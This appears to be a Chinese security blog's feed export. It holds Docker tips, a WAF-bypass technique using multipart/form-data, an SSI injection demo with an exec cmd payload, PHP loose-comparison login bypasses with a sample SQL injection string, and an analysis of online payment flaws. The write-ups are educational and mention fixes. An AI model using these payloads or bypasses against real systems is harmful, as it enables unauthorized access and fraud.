<h2 id="Best_Practices">Best Practices</h2><p>This is where general Docker best practices and war stories go:</p>
<ul>
<li><a href="http://gregoryszorc.com/blog/2014/10/16/the-rabbit-hole-of-using-docker-in-automated-tests/" target="_blank" rel="external">The Rabbit Hole of Using Docker in Automated Tests</a></li>
<li><a href="https://twitter.com/bridgetkromhout" target="_blank" rel="external">Bridget Kromhout</a> has a useful blog post on <a href="http://sysadvent.blogspot.co.uk/2014/12/day-1-docker-in-production-reality-not.html" target="_blank" rel="external">running Docker in production</a> at Dramafever.  </li>
<li>There’s also a best practices <a href="http://developers.lyst.com/devops/2014/12/08/docker/" target="_blank" rel="external">blog post</a> from Lyst.</li>
<li><a href="http://blog.relateiq.com/a-docker-dev-environment-in-24-hours-part-2-of-2/" target="_blank" rel="external">A Docker Dev Environment in 24 Hours!</a></li>
<li><a href="http://tersesystems.com/2013/11/20/building-a-development-environment-with-docker/" target="_blank" rel="external">Building a Development Environment With Docker</a></li>
<li><a href="http://samsaffron.com/archive/2013/11/07/discourse-in-a-docker-container" target="_blank" rel="external">Discourse in a Docker Container</a></li>
</ul>
<h2 id="Security">Security</h2><p>This is where security tips about Docker go.</p>
<p>If you are in the <code>docker</code> group, you effectively <a href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host" target="_blank" rel="external">have root access</a>.</p>
<p>Likewise, if you expose the docker unix socket to a container, you are giving the container <a href="https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container.html" target="_blank" rel="external">root access to the host</a>.</p>
<p>Docker image ids are <a href="https://medium.com/@quayio/your-docker-image-ids-are-secrets-and-its-time-you-treated-them-that-way-f55e9f14c1a4" target="_blank" rel="external">sensitive information</a> and should not be exposed to the outside world.  Treat them like passwords.</p>
<p>See the <a href="https://github.com/konstruktoid/Docker/blob/master/Security/CheatSheet.md" target="_blank" rel="external">Docker Security Cheat Sheet</a> by <a href="https://github.com/konstruktoid" target="_blank" rel="external">Thomas Sjögren</a>.</p>
<p>From the <a href="http://container-solutions.com/content/uploads/2015/06/15.06.15_DockerCheatSheet_A2.pdf" target="_blank" rel="external">Docker Security Cheat Sheet</a> (it’s in PDF which makes it hard to use, so copying below) by <a href="http://container-solutions.com/is-docker-safe-for-production/" target="_blank" rel="external">Container Solutions</a>:</p>
<p>Turn off interprocess communication with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d --icc=false --iptables</span><br></pre></td></tr></table></figure>
<p>Set the container to be read-only:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --read-only</span><br></pre></td></tr></table></figure>
<p>Verify images with a hashsum:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be</span><br></pre></td></tr></table></figure>
<p>Set volumes to be read only:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v $(pwd)/secrets:/secrets:ro debian</span><br></pre></td></tr></table></figure>
<p>Set memory and CPU sharing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -c 512 -mem 512m</span><br></pre></td></tr></table></figure>
<p>Define and run a user in your Dockerfile so you don’t run as root inside the container:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN groupadd -r user &#38;&#38; useradd -r -g user user&#10;USER user</span><br></pre></td></tr></table></figure>
<h2 id="Tips">Tips</h2><p>Sources:</p>
<ul>
<li><a href="http://sssslide.com/speakerdeck.com/bmorearty/15-docker-tips-in-5-minutes" target="_blank" rel="external">15 Docker Tips in 5 minutes</a></li>
</ul>
<h3 id="Last_Ids">Last Ids</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias dl=&#39;docker ps -l -q&#39;&#10;docker run ubuntu echo hello world&#10;docker commit `dl` helloworld</span><br></pre></td></tr></table></figure>
<h3 id="Commit_with_command_(needs_Dockerfile)">Commit with command (needs Dockerfile)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -run=&#39;&#123;&#34;Cmd&#34;:[&#34;postgres&#34;, &#34;-too -many -opts&#34;]&#125;&#39; `dl` postgres</span><br></pre></td></tr></table></figure>
<h3 id="Get_IP_address">Get IP address</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect `dl` | grep IPAddress | cut -d &#39;&#34;&#39; -f 4</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://stedolan.github.io/jq/download/source/jq-1.3.tar.gz&#10;tar xzvf jq-1.3.tar.gz&#10;cd jq-1.3&#10;./configure &#38;&#38; make &#38;&#38; sudo make install&#10;docker inspect `dl` | jq -r &#39;.[0].NetworkSettings.IPAddress&#39;</span><br></pre></td></tr></table></figure>
<p>or using a <a href="https://docs.docker.com/reference/commandline/inspect" target="_blank" rel="external">go template</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#39;&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;&#39; &#60;container_name&#62;</span><br></pre></td></tr></table></figure>
<h3 id="Get_port_mapping">Get port mapping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#39;&#123;&#123;range $p, $conf := .NetworkSettings.Ports&#125;&#125; &#123;&#123;$p&#125;&#125; -&#62; &#123;&#123;(index $conf 0).HostPort&#125;&#125; &#123;&#123;end&#125;&#125;&#39; &#60;containername&#62;</span><br></pre></td></tr></table></figure>
<h3 id="Find_containers_by_regular_expression">Find containers by regular expression</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(docker ps -a | grep &#34;REGEXP_PATTERN&#34; | cut -f1 -d&#34; &#34;); do echo $i; done`</span><br></pre></td></tr></table></figure>
<h3 id="Get_Environment_Settings">Get Environment Settings</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm ubuntu env</span><br></pre></td></tr></table></figure>
<h3 id="Kill_running_containers">Kill running containers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill $(docker ps -q)</span><br></pre></td></tr></table></figure>
<h3 id="Delete_old_containers">Delete old containers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a | grep &#39;weeks ago&#39; | awk &#39;&#123;print $1&#125;&#39; | xargs docker rm</span><br></pre></td></tr></table></figure>
<h3 id="Delete_stopped_containers">Delete stopped containers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -v `docker ps -a -q -f status=exited`</span><br></pre></td></tr></table></figure>
<h3 id="Delete_dangling_images">Delete dangling images</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q -f dangling=true)</span><br></pre></td></tr></table></figure>
<h3 id="Delete_all_images">Delete all images</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>
<h3 id="Show_image_dependencies">Show image dependencies</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images -viz | dot -Tpng -o docker.png</span><br></pre></td></tr></table></figure>
<h3 id="Slimming_down_Docker_containers_Intercity_Blog">Slimming down Docker containers  <a href="http://bit.ly/1Wwo61N" target="_blank" rel="external">Intercity Blog</a></h3><ul>
<li><p>Cleaning APT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN apt-get clean&#10;RUN rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span><br></pre></td></tr></table></figure>
</li>
<li><p>Flatten an image</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID=$(docker run -d image-name /bin/bash)&#10;docker export $ID | docker import &#8211; flat-image-name</span><br></pre></td></tr></table></figure>
</li>
<li><p>For backup</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID=$(docker run -d image-name /bin/bash)&#10;(docker export $ID | gzip -c &#62; image.tgz)&#10;gzip -dc image.tgz | docker import - flat-image-name</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Monitor_system_resource_utilization_for_running_containers">Monitor system resource utilization for running containers</h3><p>To check the CPU, memory and network i/o usage, you can use:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stats &#60;container&#62;&#10;``` &#10;&#10;for a single container or</span><br></pre></td></tr></table></figure>
<p>docker stats $(docker ps -q)<br>```</p>
<p>to monitor all containers on the docker host.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="https://github.com/wsargent/docker-cheat-sheet" target="_blank" rel="external">github</a></p>
<h1 id="Docker_Cheat_Sheet">Docker]]>
    </summary>
    
      <category term="docker" scheme="http://xdxd.love/tags/docker/"/>
    
      <category term="转载收藏" scheme="http://xdxd.love/categories/%E8%BD%AC%E8%BD%BD%E6%94%B6%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[通过multipart/form-data绕过waf]]></title>
    <link href="http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/"/>
    <id>http://xdxd.love/2015/12/18/通过multipart-form-data绕过waf/</id>
    <published>2015-12-18T09:07:37.000Z</published>
    <updated>2015-12-18T11:02:11.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://www.freebuf.com/vuls/88271.html" target="_blank" rel="external">LuManager 高危SQL注入0day分析</a>中提到监控到利用payload如下：</p>
<p><img src="/images/postwaf1.png" alt="/images/postwaf1.png"></p>
<p>可以看到攻击者使用了<code>multipart/form-data</code>格式发送payload。对于应用来说，和使用<code>application/x-www-form-urlencoded</code>获取到的数据是一致的。关于<code>multipart/form-data</code>和<code>application/x-www-form-urlencode</code>的区别，可以参考<a href="http://stackoverflow.com/questions/4007969/application-x-www-form-urlencoded-or-multipart-form-data" target="_blank" rel="external">stackoverflow</a>。<br><a href="https://gist.github.com/joyrexus/524c7e811e4abf9afe56" target="_blank" rel="external">github</a>。</p>
<p>简单总结，通常文件上传的时候用的是<code>multipart/form-data</code>,传递普通参数用的<code>x-www-form-urlencoded</code>。文件上传包含大量二进制数据，非字符数字组成的数据，如果使用urlencode，需要全部采用url编码。使得需要传输的数据膨胀。</p>
<p>关于使用<code>multipart/form-data</code>绕过waf也有比较多的讨论了。<a href="https://javaweb.org/?p=1842" target="_blank" rel="external">multipart/form-data PHP和Java通用的WAF绕过方法</a>,<a href="http://wooyun.org/bugs/wooyun-2010-044349" target="_blank" rel="external">360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一</a>。</p>
<p>之所以能绕过waf，应该是<code>multipart/form-data</code>通常用来传输二进制，如果waf对大文件解析可能性能有影响。所以写扫描器的时候如果用<code>form-data</code>来发送payload也许会有惊喜，参考<a href="http://www.wooyun.org/bugs/wooyun-2015-0147301" target="_blank" rel="external">百度某站st2命令执行(独特执行姿势)</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://www.freebuf.com/vuls/88271.html" target="_blank" rel="external">LuManager 高危SQL注入0day分析</a>中提到监控到利用payload如下：</p>
<p><img]]>
    </summary>
    
      <category term="waf" scheme="http://xdxd.love/tags/waf/"/>
    
      <category term="奇技淫巧" scheme="http://xdxd.love/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[同时使用gitcafe和github做博客]]></title>
    <link href="http://xdxd.love/2015/12/11/%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8gitcafe%E5%92%8Cgithub%E5%81%9A%E5%8D%9A%E5%AE%A2/"/>
    <id>http://xdxd.love/2015/12/11/同时使用gitcafe和github做博客/</id>
    <published>2015-12-11T08:54:54.000Z</published>
    <updated>2015-12-11T09:52:14.000Z</updated>
    <content type="html"><![CDATA[<p>使用github做博客一直感觉不错。只是网络环境问题，萌生了在gitcafe做一个备份的想法。其实方案也比较成熟了。搜索gitcafe github有不少文章详细介绍了如何实现。使用hexo实现起来也很简单。hexo支持同时部署到多个地方，修改一下配置文件就可以。平时使用起来也不会增加操作。</p>
<p><img src="/images/gitcafe1.png" alt=""><br>这里记录一下遇到的一个问题。就是gitcafe 文档里说明不支持A记录域名解析，只能cname。可是之前博客一直用的<a href="http://xdxd.love">xdxd.love</a>，也不准备加上www。所以参考<a href="http://segmentfault.com/q/1010000004130246?_ea=501447" target="_blank" rel="external">segmentfalt</a>这里完全可以绑定A记录。</p>
<p>看来gitcafe还是很给力的嘛。看来文档也不能完全相信，如果事情都是按照预想设计的那样，就不需要咋们做安全的了嘛。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>使用github做博客一直感觉不错。只是网络环境问题，萌生了在gitcafe做一个备份的想法。其实方案也比较成熟了。搜索gitcafe github有不少文章详细介绍了如何实现。使用hexo实现起来也很简单。hexo支持同时部署到多个地方，修改一下配置文件就可以。平时使用起]]>
    </summary>
    
      <category term="github" scheme="http://xdxd.love/tags/github/"/>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ssi漏洞介绍]]></title>
    <link href="http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/"/>
    <id>http://xdxd.love/2015/12/09/ssi漏洞介绍/</id>
    <published>2015-12-09T08:47:30.000Z</published>
    <updated>2015-12-10T03:18:48.000Z</updated>
    <content type="html"><![CDATA[<h1 id="SSI">SSI</h1><p>SSI Injection <a href="https://en.wikipedia.org/wiki/Server_Side_Includes" target="_blank" rel="external">(Server-side Include)</a>服务器端包含提供了一种对现有HTML文档增加动态内容的方法。根据查资料的理解这是http服务器提供支持的一个特性。apache和iis都可以通过配置支持SSI。<a href="http://man.chinaunix.net/newsoft/ApacheManual/howto/ssi.html" target="_blank" rel="external">apache关于SSI的文档</a></p>
<p>在网页内容被返回给用户之前，服务器会执行网页内容中的SSI标签。在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
<h1 id="实例演示">实例演示</h1><p>使用bwapp测试：</p>
<p>输入ssi支持的标签语法，查看返回是否执行</p>
<pre><code><span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span>
</code></pre><p><img src="/images/ssi1.png" alt=""></p>
<p><img src="/images/ssi2.png" alt=""></p>
<pre><code><span class="comment">&lt;!--#exec cmd="whoami" --&gt;</span>
</code></pre><p><img src="/images/ssi3.png" alt=""></p>
<p><img src="/images/ssi4.png" alt=""></p>
<p>默认情况下，ssi不支持cmd执行，所以ssi这种漏洞会慢慢退出历史舞台。</p>
<h1 id="修复方案">修复方案</h1><p>ssi这种技术已经比较少用了。如果应用没有使用到ssi，关闭服务器对ssi的支持即可。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/23128" target="_blank" rel="external">http://zone.wooyun.org/content/23128</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="SSI">SSI</h1><p>SSI Injection <a href="https://en.wikipedia.org/wiki/Server_Side_Includes" target="_blank" rel="external">(Server-si]]>
    </summary>
    
      <category term="ssi" scheme="http://xdxd.love/tags/ssi/"/>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php比较操作符的安全问题]]></title>
    <link href="http://xdxd.love/2015/12/03/php%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2015/12/03/php比较操作符的安全问题/</id>
    <published>2015-12-03T01:32:15.000Z</published>
    <updated>2015-12-03T01:50:15.000Z</updated>
    <content type="html"><![CDATA[<p>地址：<a href="http://drops.wooyun.org/tips/7679" target="_blank" rel="external">http://drops.wooyun.org/tips/7679</a><br>0x00 比较操作符</p>
<p>php的比较操作符有==（等于）松散比较，===（完全等于）严格比较，这里面就会引入很多有意思的问题。</p>
<p>在松散比较的时候，php会将他们的类型统一，比如说字符到数字，非bool类型转换成bool类型，为了避免意想不到的运行效果，应该使用严格比较。如下是php manual上的比较运算符表：</p>
<p>例子        名称         结果<br>$a == $b    等于      TRUE，如果类型转换后 $a 等于 $b。<br>$a === $b   全等      TRUE，如果 $a 等于 $b，并且它们的类型也相同。<br>$a != $b    不等      TRUE，如果类型转换后 $a 不等于 $b。<br>$a &lt;&gt; $b    不等      TRUE，如果类型转换后 $a 不等于 $b。<br>$a !== $b   不全等     TRUE，如果 $a 不等于 $b，或者它们的类型不同。<br>$a &lt; $b     小与      TRUE，如果 $a 严格小于 $b。<br>$a &gt; $b     大于      TRUE，如果 $a 严格大于 $b。<br>$a &lt;= $b    小于等于     TRUE，如果 $a 小于或者等于 $b。<br>$a &gt;= $b    大于等于     TRUE，如果 $a 大于或者等于 $b。<br>0x01 安全问题</p>
<p>1 hash比较缺陷</p>
<p>php在处理hash字符串的时候会用到!=,==来进行hash比较，如果hash值以0e开头，后边都是数字，再与数字比较，就会被解释成0*10^n还是为0，就会被判断相等，绕过登录环节。</p>
<pre><code>root@kali:~/tool<span class="preprocessor"># php -r 'var_dump(<span class="title">"00e0345"</span> == <span class="title">"0"</span>);var_dump(<span class="title">"0e123456789"</span>==<span class="title">"0"</span>);var_dump(<span class="title">"0e1234abc"</span>==<span class="title">"0"</span>);'</span>
<span class="keyword">bool</span>(<span class="literal">true</span>)
<span class="keyword">bool</span>(<span class="literal">true</span>)
<span class="keyword">bool</span>(<span class="literal">false</span>)
</code></pre><p>当全是数字的时候，宽松的比较会执行尽力模式，如0e12345678会被解释成0*10^12345678,除了e不全是数字的时候就不会相等，这能从var_dump(“0e1234abc”==”0”)可以看出来。</p>
<p>2 bool 欺骗</p>
<p>当存在json_decode和unserialize的时候，部分结构会被解释成bool类型，也会造成欺骗。json_decode示例代码：</p>
<pre><code><span class="variable">$json</span>_str = <span class="string">'{"user":true,"pass":true}'</span>;
<span class="variable">$data</span> = json_decode(<span class="variable">$json</span>_str,<span class="literal">true</span>);
<span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">'user'</span>] == <span class="string">'admin'</span> &amp;&amp; <span class="variable">$data</span>[<span class="string">'pass'</span>]==<span class="string">'secirity'</span>)
{
    print_r(<span class="string">'logined in as bool'</span>.<span class="string">"\n"</span>);
}
</code></pre><p>运行结果：</p>
<pre><code>root<span class="variable">@kali</span><span class="symbol">:/var/www</span><span class="comment"># php /root/php/hash.php</span>
logined <span class="keyword">in</span> as bool
</code></pre><p>unserialize示例代码：</p>
<pre><code><span class="variable">$unserialize</span>_str = <span class="string">'a:2:{s:4:"user";b:1;s:4:"pass";b:1;}'</span>;
<span class="variable">$data</span>_unserialize = unserialize(<span class="variable">$unserialize</span>_str);
<span class="keyword">if</span> (<span class="variable">$data</span>_unserialize[<span class="string">'user'</span>] == <span class="string">'admin'</span> &amp;&amp; <span class="variable">$data</span>_unserialize[<span class="string">'pass'</span>]==<span class="string">'secirity'</span>)
{
    print_r(<span class="string">'logined in unserialize'</span>.<span class="string">"\n"</span>);
}
</code></pre><p>运行结果如下：</p>
<pre><code>root<span class="variable">@kali</span><span class="symbol">:/var/www</span><span class="comment"># php /root/php/hash.php</span>
logined <span class="keyword">in</span> unserialize
</code></pre><p>3 数字转换欺骗</p>
<pre><code><span class="variable">$user</span>_id = ($_POST[<span class="string">'user_id'</span>]);
<span class="keyword">if</span> (<span class="variable">$user</span>_id == <span class="string">"1"</span>)
{
    <span class="variable">$user</span>_id = (int)(<span class="variable">$user</span>_id);
    #<span class="variable">$user</span>_id = intval(<span class="variable">$user</span>_id);
    <span class="variable">$qry</span> = <span class="string">"SELECT * FROM `users` WHERE user_id='$user_id';"</span>;
}
<span class="variable">$result</span> = mysql_query(<span class="variable">$qry</span>) or die(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );
print_r(mysql_fetch_row(<span class="variable">$result</span>));
</code></pre><p>将user_id=0.999999999999999999999发送出去得到结果如下：</p>
<pre><code>Array
(
    [<span class="number">0</span>] =&gt; <span class="number">0</span>
    [<span class="number">1</span>] =&gt; lxx'
    [<span class="number">2</span>] =&gt; 
    [<span class="number">3</span>] =&gt; 
    [<span class="number">4</span>] =&gt; 
    [<span class="number">5</span>] =&gt; 
)
</code></pre><p>本来是要查询user_id的数据，结果却是user_id=0的数据。int和intval在转换数字的时候都是就低的，再如下代码:</p>
<pre><code><span class="keyword">if</span> ($_POST[<span class="string">'uid'</span>] != <span class="number">1</span>) {
 <span class="variable">$res</span> = <span class="variable">$db-</span>&gt;query(<span class="string">"SELECT * FROM user WHERE uid=%d"</span>, (int)$_POST[<span class="string">'uid'</span>]);
 mail(...);
} <span class="keyword">else</span> {
 die(<span class="string">"Cannot reset password of admin"</span>);
}
</code></pre><p>假如传入1.1，就绕过了$_POST[‘uid’]！=1的判断，就能对uid=1的用户进行操作了。另外intval还有个尽力模式，就是转换所有数字直到遇到非数字为止，如果采用:</p>
<pre><code><span class="keyword">if</span> (intval(<span class="variable">$qq</span>) === <span class="string">'123456'</span>)
{
    <span class="variable">$db-</span>&gt;query(<span class="string">"select * from user where qq = $qq"</span>)
}
</code></pre><p>攻击者传入123456 union select version()进行攻击。</p>
<p>4 PHP5.4.4 特殊情况</p>
<p>这个版本的php的一个修改导致两个数字型字符溢出导致比较相等</p>
<pre><code>$ php -r 'var_dump("<span class="number">615295194528</span><span class="number">097206937025</span><span class="number">83126814</span>" == "<span class="number">615295194528</span><span class="number">097200000000</span><span class="number">00000000</span>")<span class="comment">;'</span>
bool(true)
</code></pre><p>3 题外话：</p>
<p>同样有类似问题的还有php strcmp函数,manual上是这么解释的，int strcmp ( string $str1 , string $str2 ),str1是第一个字符串，str2是第二个字符串，如果str1小于str2，返回<0,如果str1>str2,返回&gt;0,两者相等返回0，假如str2为一个array呢？</0,如果str1></p>
<pre><code>$_GET[<span class="string">'key'</span>] = <span class="keyword">array</span>();
<span class="variable">$key</span> = <span class="string">"llocdpocuzion5dcp2bindhspiccy"</span>;
<span class="variable">$flag</span> = strcmp(<span class="variable">$key</span>, $_GET[<span class="string">'key'</span>]);
<span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="number">0</span>) {
    print <span class="string">"Welcome!"</span>;
} <span class="keyword">else</span> {
    print <span class="string">"Bad key!"</span>;
}
</code></pre><p>运行结果：</p>
<pre><code>root@kali:~/php<span class="comment"># php strcmp.php</span>
PHP Warning: <span class="function"> strcmp(</span><span class="function">)</span> expects parameter 2 to be string,<span class="instruction"> array </span>given in /root/php/strcmp.php on line 13
Welcome!
</code></pre><p>参考：<br>1，<a href="http://phpsadness.com/sad/47" target="_blank" rel="external">http://phpsadness.com/sad/47</a><br>2，<a href="http://php.net/language.operators.comparison" target="_blank" rel="external">http://php.net/language.operators.comparison</a><br>3，<a href="http://indico.cern.ch/event/241705/material/slides/0.pdf" target="_blank" rel="external">http://indico.cern.ch/event/241705/material/slides/0.pdf</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>地址：<a href="http://drops.wooyun.org/tips/7679" target="_blank" rel="external">http://drops.wooyun.org/tips/7679</a><br>0x00 比较操作符</p>
<p>]]>
    </summary>
    
      <category term="php" scheme="http://xdxd.love/tags/php/"/>
    
      <category term="转载收藏" scheme="http://xdxd.love/categories/%E8%BD%AC%E8%BD%BD%E6%94%B6%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[支付漏洞总结]]></title>
    <link href="http://xdxd.love/2015/12/02/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://xdxd.love/2015/12/02/支付漏洞总结/</id>
    <published>2015-12-02T05:47:07.000Z</published>
    <updated>2015-12-04T07:58:14.000Z</updated>
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安全问题。</p>
<h2 id="支付宝/在线支付流程">支付宝/在线支付流程</h2><p><a href="https://cshall.alipay.com/support/help_detail.htm?help_id=476935" target="_blank" rel="external">支付宝即时到账接口开发流程</a></p>
<p>在线支付从功能上来说是通过支付宝的支付渠道，付款者直接汇款给另一个拥有支付宝账号的收款者。整个流程说明如下：引用自支付宝文档。<br><img src="/images/zaixianzhifu1.png" alt=""></p>
<pre><code>(<span class="number">1</span>)构造请求数据
商户根据支付宝提供的接口规则，通过程序生成得到签名结果及要传输给支付宝的数据集合。
(<span class="number">2</span>)发送请求数据
把构造完成的数据集合，通过页面链接跳转或表单提交的方式传递给支付宝。
(<span class="number">3</span>)支付宝对请求数据进行处理
支付宝得到这些集合后，会先进行安全校验等验证，一系列验证通过后便会处理这次发送过来的数据请求。
(<span class="number">4</span>)返回处理的结果数据
对于处理完成的交易，支付宝会以两种方式把数据反馈给商户网站。
程序上自动进行重新构造URL地址链接，在用户当前页面上通过自动跳转的方式跳回商户在请求时设定好的页面路径地址（参数return_url，如果商户没有设定，则不会进行该操作）
支付宝服务器主动发起通知，调用商户在请求时设定好的页面路径（参数notify_url，如果商户没有设定，则不会进行该操作）。
(<span class="number">5</span>)对获取的返回结果数据进行处理
商户在同步通知处理页面（参数return_url指定页面文件）或服务器异步通知页面（参数notify_url指定页面文件）获取支付宝返回的结果数据后，可以结合自身网站的业务逻辑进行数据处理（如：订单更新、自动充值到会员账号中等）。
</code></pre><h2 id="业务思考">业务思考</h2><p>通过这个流程可以知道。应用端做的两个重要步骤，一个是拼接支付的请求，返回给用户浏览器，用户浏览器请求支付宝接口，进入支付流程，整个支付的环节是和支付宝端交互，支付完成之后，支付宝通过通知接口给应用发送支付成功的通知。应用通过支付宝的通知信息来判断支付是否成功。</p>
<h2 id="风险分析">风险分析</h2><p>首先第二步，发送请求数据。这一步虽然是在用户的浏览器端完成的。但是支付接口都有强制的签名来保证完整性，所以这里数据是无法篡改的，在签名key不泄露的情况下。所以通常见到的支付漏洞都是第一步，应用构造请求数据的时候出现的缺陷。</p>
<p>对于交易这一业务功能来讲，应用只需要用户提供商品id和商品数量就可以满足支付所需要的所有数据了。这个地方容易出现的问题主要有以下几种：</p>
<p>1，直接把订单的总金额从客户端获取，放在了构造的请求交易数据中。<br>2，虽然只传递商品id和数量，但是数量没有做白名单限制，造成可以输入负数或者大数造成计算溢出，导致最终计算的订单金额出现错误。<br>3，除了商品数量和商品id，还有其他参与订单金额计算的参数从客户端获取，比如运费等</p>
<p>第三步和第四步是支付宝进行的处理，所以也不存在问题。第五步，支付宝通知应用用户付款成功，这里支付宝设计了notify_id供应用来验证通知信息是否是有效的。但是一般很少见人用，因为这一步数据也是有签名的。只要应用对支付宝的通知信息进行签名验证就可以。但是这个验证是应用自己来控制的，并不像第二步是支付宝控制的进行签名验证，所以一旦应用没有对支付宝通知信息进行签名验证就会导致伪造支付宝的通知信息，欺骗应用支付成功的漏洞。这种类型的问题看到的案例比较少。比如<a href="http://wooyun.org/bugs/wooyun-2010-0146510" target="_blank" rel="external">我是如何1元再购特斯拉的</a>。这种类型的问题应该也比较常见，可能是对这个逻辑的测试还不够关注。</p>
<p>所以通过分析整个在线支付的流程可以看到，容易出现支付漏洞的有两个点，一个是构造支付请求的阶段，一个是对返回的结果数据进行处理的阶段。没有对签名进行验证，会存在请求伪造和重放攻击。这里分析的是一个典型的支付流程，此外还有一些比较复杂的交易设计，比如设计了可以修改订单的功能等，随着功能的增加也会引入一些安全问题。</p>
<h2 id="安全的设计方案：">安全的设计方案：</h2><p>只从客户端获取商品id和数量，对数量范围进行限制。对接受支付宝通知的接口对通知信息进行签名验证，对支付金额和订单金额进行对比以及验证支付订单号避免重放攻击。只要考虑到这几个问题，就可以设计一个比较安全的支付流程。</p>
<h2 id="支付宝提供的验证方式">支付宝提供的验证方式</h2><p>notifyid<br>total_fee<br>sign<br>order_no 防重放</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://drops.wooyun.org/papers/345" target="_blank" rel="external">乌云drops</a></p>
]]></content>
    <summary type="html">
